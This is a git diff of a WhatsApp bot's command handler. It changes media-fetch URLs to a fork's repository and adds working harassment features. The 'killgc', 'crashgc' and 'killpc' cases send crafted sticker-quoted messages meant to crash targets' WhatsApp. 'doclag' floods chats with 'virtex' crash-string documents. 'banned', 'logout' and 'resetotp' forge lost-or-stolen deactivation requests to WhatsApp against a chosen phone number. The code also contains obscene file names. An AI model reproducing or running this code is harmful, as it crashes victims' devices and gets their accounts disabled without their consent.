+if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/kotori.json')
+if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/kpop.json')
+if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/kucing.json')
+if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/kurumi.json')
+if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/lisa.json')
+if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/loli.json')
+if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/madara.json')
+if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/megumin.json')
+if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/mikasa.json')
+if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/mikey.json')
+if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/miku.json')
+if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/minato.json')
+if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/mobil.json')
+if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/motor.json')
+if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/mountain.json')
+if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/naruto.json')
+if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/neko.json')
+if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/neko2.json')
+if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/nekonime.json')
+if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/nezuko.json')
+if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/onepiece.json')
+if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/pentol.json')
+if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/pokemon.json')
+if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/profil.json')
+if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/programming.json')
+if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/pubg.json')
+if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/randblackpink.json')
+if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/randomnime.json')
+if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/randomnime2.json')
+if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/rize.json')
+if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/rose.json')
+if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/ryujin.json')
+if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/sagiri.json')
+if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/sakura.json')
+if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/sasuke.json')
+if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/satanic.json')
+if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/shina.json')
+if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/shinka.json')
+if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/shinomiya.json')
+if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/shizuka.json')
+if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/shota.json')
+if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/tatasurya.json')
+if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/technology.json')
+if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/tejina.json')
+if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/toukachan.json')
+if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/tsunade.json')
+if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/waifu.json')
+if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/wallhp.json')
+if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/wallml.json')
+if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/wallnime.json')
+if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/yotsuba.json')
+if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/yuki.json')
+if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/yulibocil.json')
+if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/yumeko.json')
 let yeha = heyy[Math.floor(Math.random() * heyy.length)]
 XeonBotInc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
 }
@@ -5460,8 +5466,8 @@ if (!AntiNsfw) return replygcxeon(mess.nsfw)
 XeonStickWait()
 let heyy
     let yeha = heyy[Math.floor(Math.random() * heyy.length)]
-    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
-    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
+    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/gifs.json')
+    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/master/foot.json')
 XeonBotInc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
 }
 break
@@ -5901,7 +5907,7 @@ break
   }
  break
 case 'git': case 'gitclone':
-if (!args[0]) return replygcxeon(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/XeonMedia`)
+if (!args[0]) return replygcxeon(`Where is the link?\nExample :\n${prefix}${command} https://github.com/Duxlin/XeonMedia`)
 if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcxeon(`Link invalid!!`)
 let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
     let [, user, repo] = args[0].match(regex1) || []
@@ -6428,7 +6434,7 @@ return replygcxeon('Error')
 break
 case 'patrick':
 case 'patricksticker': {
-var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
+var ano = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/main/patrick')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
 encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
@@ -6437,7 +6443,7 @@ break
 case 'dogesticker':
 case 'dogestick':
 	case 'doge':{
-var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/doge')
+var ano = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/main/doge')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
 encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
@@ -6445,7 +6451,7 @@ encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: 
 break
 case 'lovesticker':
 case 'lovestick' :{
-var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/love')
+var ano = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/main/love')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
 encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
@@ -6454,7 +6460,7 @@ encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: 
 break
 case 'gura':
 case 'gurastick':{
-var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
+var ano = await fetchJson('https://raw.githubusercontent.com/Duxlin/XeonMedia/main/gura')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
 encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
@@ -6545,7 +6551,7 @@ if (!text) return replygcxeon('What location?')
            )
            }
            break
-           case 'wanumber': case 'searchno': case 'searchnumber':{
+           case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
            	if (!text) return replygcxeon(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
 var inputnumber = text.split(" ")[0]
         
@@ -6603,35 +6609,281 @@ var inputnumber = text.split(" ")[0]
         replygcxeon(`${text66}${nobio}${nowhatsapp}`)
         }
 break
-	//bug && war cases
-case 'xbugp' : { //crashes mod whatsapps
+case "idgroup": case "groupid": {
 if (!XeonTheCreator) return XeonStickOwner()
-if (!text) return replygcxeon(`Example : ${prefix + command} xeon bihari😂`)
-const { xeonorwot } = require('./XBug/xeonbut2')
-let teks = `${text}`
-{
-XeonBotInc.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${xeonorwot}`, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `PAPA XEON`,"body": ` ${xeonytimewisher} my friend ${pushname}`,
-mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${xeonorwot}`,
-showAdAttribution: true,
-sourceUrl: websitex,
-thumbnailUrl: thumb, 
+let getGroups = await XeonBotInc.groupFetchAllParticipating()
+let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
+let anu = groups.map((v) => v.id)
+let teks = `⬣ *GROUP LIST BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
+for (let x of anu) {
+let metadata2 = await XeonBotInc.groupMetadata(x)
+teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
 }
-}}}}}, { quoted:m})
+replygcxeon(teks + `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`)
+}
+break
+	//bug && war cases 
+	//⚠️do not edit cases otherwise bug not work
+	case 'xgcori':
+case 'xgcbusi':
+case 'xgcmod':
+case 'xgcgb': 
+	case 'killgc':
+case 'crashgc':
+case 'fuckgc': {
+const xeonoh = { 
+key: {
+fromMe: [], 
+participant: "0@s.whatsapp.net",  remoteJid: ""
+},
+
+'message': {
+ "stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
+"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
+"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
+"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
+"mimetype": "image/webp",
+"height": 40,
+"width": 40,
+"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
+"fileLength": "99999999",
+"mediaKeyTimestamp": "16572901099967",
+        'isAnimated': []
+}}}
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(m.chat, {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+replygcxeon(`Succes!!`)
+    }
+    break
+	case 'xpcori':
+case 'xpcbusi':
+case 'xpcmod':
+case 'xpcgb': 
+	case 'killpc':
+case 'crashpc':
+case 'fuckpc': {
+		if (!isPrem) return replyprem(mess.premium)
+if (Input) {
+if (Input == owner + "@s.whatsapp.net") return replygcxeon(`Can't perform this action in my owner's number🦄!`)
+await replygcxeon(`Bugging in process...`)
+const xeonoh = { 
+key: {
+fromMe: [], 
+participant: "0@s.whatsapp.net",  remoteJid: ""
+},
+
+'message': {
+ "stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
+"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
+"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
+"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
+"mimetype": "image/webp",
+"height": 40,
+"width": 40,
+"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
+"fileLength": "99999999",
+"mediaKeyTimestamp": "16572901099967",
+        'isAnimated': []
+}}}
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+XeonBotInc.sendMessage(q + "@s.whatsapp.net", {text: 'SUBSCRIBE Duxbot6413 ON YOUTUBE!!'}, {quoted:xeonoh})
+await sleep(2000)
+m.reply(`Succes!!`)
+} else replygcxeon('Enter Target Number!')
+}
+break
+case 'doclag':{
+	if (args.length == 0) return replygcxeon(`Amount?`)
+	const amountx = `${encodeURI(q)}`
+const { virtex } = require('./XBug/virtex')
+for (let i = 0; i < amountx; i++) {
+XeonBotInc.sendMessage(m.chat, { document: fs.readFileSync("./XBug/teri_ma_ki_chut_me_mera_garam_lund"), mimetype: 'application/pdf', fileName: `Https://wa.me/settings ${virtex}.${virtex}.${virtex}`, caption: `Https://wa.me/settings\n${virtex}\n${virtex}`}, { quoted: m })
 }
 }
 break
-case 'xbugr':{ //crashes both mod and playstore wa
-if (!XeonTheCreator) return XeonStickOwner()
-const { xeonorwot } = require('./XBug/xeonbut2')
-let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
-XeonBotInc.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
-}
-break
+case "banned":
+case "unbanned":
+   case "kenon":
+      case "logout":
+case "verif":
 case "resetotp": {
+	if (!isPrem) return replyprem(mess.premium)
+	if (Input) {
+let cekno = await XeonBotInc.onWhatsApp(Input)
+if (cekno.length == 0) return replygcxeon(`The participant is no longer registered on WhatsApp`)
+if (Input == owner + "@s.whatsapp.net") return replygcxeon(`Can't perform this action in my owner's number🦄!`)
+var targetnya = m.sender.split('@')[0]
+try {
+   var axioss = require ("axios")
+   let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+ let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
+ let cookie = ntah.headers["set-cookie"].join("; ")
+ let $ = cheerio.load(ntah.data)
+ let $form = $("form");
+ let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
+ let form = new URLSearchParams()
+ form.append("jazoest", $form.find("input[name=jazoest]").val())
+ form.append("lsd", $form.find("input[name=lsd]").val())
+ form.append("step", "submit")
+ form.append("country_selector", "ID")
+ form.append("phone_number", q)
+ form.append("email", email.data[0])
+ form.append("email_confirm", email.data[0])
+ form.append("platform", "ANDROID")
+ form.append("your_message", "Perdido/roubado: desative minha conta")
+ form.append("__user", "0")
+ form.append("__a", "1")
+ form.append("__csr", "")
+ form.append("__req", "8")
+ form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
+ form.append("dpr", "1")
+ form.append("__ccg", "UNKNOWN")
+ form.append("__rev", "1006630858")
+ form.append("__comment_req", "0")
+ let res = await axioss({
+   url,
+   method: "POST",
+   data: form,
+   headers: {
+     cookie
+   }
+ })
+replygcxeon(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
+} catch (err) {replygcxeon(`${err}`)}
+} else replygcxeon('Enter Target Number!')
+}
+break
+case "bannumber": {
+	if (!isPrem) return replyprem(mess.premium)
 if (Input) {
 let cekno = await XeonBotInc.onWhatsApp(Input)
 if (cekno.length == 0) return replygcxeon(`The participant is no longer registered on WhatsApp`)
-if (Input == owner + "@s.whatsapp.net") return replygcxeon(`Can't logout My Owner🦄!`)
+if (Input == owner + "@s.whatsapp.net") return replygcxeon(`Can't perform this action in my owner's number🦄!`)
 var targetnya = m.sender.split('@')[0]
 try {
 var axioss = require('axios')
